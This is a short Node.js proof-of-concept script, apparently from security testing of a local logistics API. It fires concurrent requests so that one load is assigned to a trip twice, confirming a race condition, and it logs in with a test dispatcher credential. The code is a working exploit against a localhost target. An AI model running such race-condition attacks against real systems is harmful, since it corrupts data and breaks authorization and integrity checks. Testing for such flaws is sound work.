const axios = require('axios');
const helper = require('../../loop-11.5/helper.js');

async function login(email, password) {
  const res = await axios.post('http://localhost:8080/api/v1/auth/login', {
    email,
    password
  });
  return res.data.access_token;
}

async function attack() {
  const dispatcherToken = await login('dispatcher@companya.com', 'password123');

  const tripId = helper.entitiesA.tripId;
  const loadId = helper.entitiesA.loadId;

  let successes = 0;
  for (let i = 0; i < 20; i++) {
    // Make sure load is unassigned
    await axios.patch(`http://localhost:8080/api/v1/loads/${loadId}`, { tripId: null, status: 'PENDING' }, { headers: { Authorization: `Bearer ${dispatcherToken}` } }).catch(() => {});
    
    // Sometimes the patch above fails if it's not a valid state transition or whatever.
    // Let's verify it works
    const promises = [];
    promises.push(
      axios.post(`http://localhost:8080/api/v1/trips/${tripId}/loads`, { loadIds: [loadId] }, { headers: { Authorization: `Bearer ${dispatcherToken}` } })
      .then(() => { successes++; console.log(`Run ${i} Req 1 SUCCESS`); })
      .catch((e) => { console.log(`Run ${i} Req 1 FAIL: ${e.response?.status}`); })
    );
    promises.push(
      axios.post(`http://localhost:8080/api/v1/trips/${tripId}/loads`, { loadIds: [loadId] }, { headers: { Authorization: `Bearer ${dispatcherToken}` } })
      .then(() => { successes++; console.log(`Run ${i} Req 2 SUCCESS`); })
      .catch((e) => { console.log(`Run ${i} Req 2 FAIL: ${e.response?.status}`); })
    );
    await Promise.all(promises);
  }

  console.log(`Total Successes (out of 40): ${successes}`);
  if (successes > 20) {
    console.log("RACE CONDITION CONFIRMED: More successes than iterations (Double Assignment).");
  } else {
    console.log("RACE CONDITION NOT REPRODUCED OR ALREADY FIXED.");
  }
}

attack().catch(console.error);
